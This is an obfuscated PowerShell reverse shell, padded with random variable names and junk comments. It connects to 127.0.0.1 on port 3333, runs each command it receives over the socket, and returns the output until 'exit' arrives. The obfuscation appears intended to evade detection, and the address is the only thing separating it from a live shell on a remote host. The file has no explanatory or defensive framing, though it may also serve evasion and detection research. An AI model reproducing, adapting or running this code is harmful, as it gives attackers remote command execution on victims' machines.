$lRjkhBbzRQRtAJeWsPvvXeXcSd = new-object System.Net.Sockets.TcpClient('127.0.0.1', 3333)<#brtJhNSiRGIvjarfbrb#>
<#YAVGBUzEOevnrkRJurN#>
if($lRjkhBbzRQRtAJeWsPvvXeXcSd -eq $(850 -as [void])){exit 1}<#nmdDXuuHBRyemPiVcyf#>
$YnbvmpOgxjupmDkTakRouYJdMD = $lRjkhBbzRQRtAJeWsPvvXeXcSd.GetStream()<#MMtdjUbdmOtuPGuTjkg#>
<#GReqwDOPFsTQGeMULiS#>
$NZUCqhRtwuThMJIviLjSURppFP = new-object System.IO.StreamWriter($YnbvmpOgxjupmDkTakRouYJdMD)<#mMyOKSqgVIorkMgFXSV#>
<#kMKOWLwierYAphHOUZs#>
$pqvUSSBuUdTdRpvcaRnJUqKYVH = new-object System.Byte[] 1024<#JfjaGKKoKAKfHbASIXZ#>
<#EXstDFtilGkTANxutYb#>
$FzEagQCnmGAhPOBmZdGWGWiJJE = new-object System.Text.AsciiEncoding<#IDzFAEoKyXYrRtZJdBv#>
<#nemlEkJljvSjFLcYMpD#>
do{<#GamuBZckopESTZSPqbi#>
	$NZUCqhRtwuThMJIviLjSURppFP.Write("> ")<#umcxyeMMMQTaFQvobYv#>
<#EyPgkVaidtPnjilqZOR#>
	$NZUCqhRtwuThMJIviLjSURppFP.Flush()<#WtehJXuUWLQsiIJeTJr#>
<#aYipoRoRONHmPrIrvJs#>
	$txxkvvgHALypaEpvzDUTFINdpu = $(545 -as [System.DBNull])<#pXbeKptdegqYSlFMLfx#>
<#ZfYUfzLJAWblDtDOLGX#>
	while($YnbvmpOgxjupmDkTakRouYJdMD.DataAvailable -or ($txxkvvgHALypaEpvzDUTFINdpu = $YnbvmpOgxjupmDkTakRouYJdMD.Read($pqvUSSBuUdTdRpvcaRnJUqKYVH, 0, 1024)) -eq $(721 -as [System.DBNull])){}	<#WSSTJEyDAnDjlVwaIBV#>
	$eWiZGWPLGyheDQVgVfjXSHqmZv = $FzEagQCnmGAhPOBmZdGWGWiJJE.GetString($pqvUSSBuUdTdRpvcaRnJUqKYVH, 0, $txxkvvgHALypaEpvzDUTFINdpu).Replace("`r`n","").Replace("`n","")<#oXnuPhseauCShXtCDTr#>
<#uIhEUGKyxvAzOUarWgb#>
	if(!$eWiZGWPLGyheDQVgVfjXSHqmZv.equals("exit")){<#mKMGzKEANIJVnPRvQPJ#>
		$eWiZGWPLGyheDQVgVfjXSHqmZv = $eWiZGWPLGyheDQVgVfjXSHqmZv.split(' ')<#lBIlDywCXHtLDxlVBjG#>
	        $TLQfHngwocQfndiWJRwMLhuPEu = [string](&$eWiZGWPLGyheDQVgVfjXSHqmZv[0] $eWiZGWPLGyheDQVgVfjXSHqmZv[1..$eWiZGWPLGyheDQVgVfjXSHqmZv.length])<#HaeASItPXwUPUJauxYh#>
<#YCcfUrBBtaTHhwOEuNg#>
		if($TLQfHngwocQfndiWJRwMLhuPEu -ne $(38 -as [void])){ $NZUCqhRtwuThMJIviLjSURppFP.WriteLine($TLQfHngwocQfndiWJRwMLhuPEu)}<#XobLCYZFpWatNCCiOIt#>
	}<#RpWwvYJAUdeIrbngunr#>
}While (!$eWiZGWPLGyheDQVgVfjXSHqmZv.equals("exit"))<#eQRtAjcGryOQaQZpgYV#>
$NZUCqhRtwuThMJIviLjSURppFP.close()<#MXFOCsumoghwaHorLCl#>
$lRjkhBbzRQRtAJeWsPvvXeXcSd.close()<#WMpqHBMUsjOdANHKjEe#>
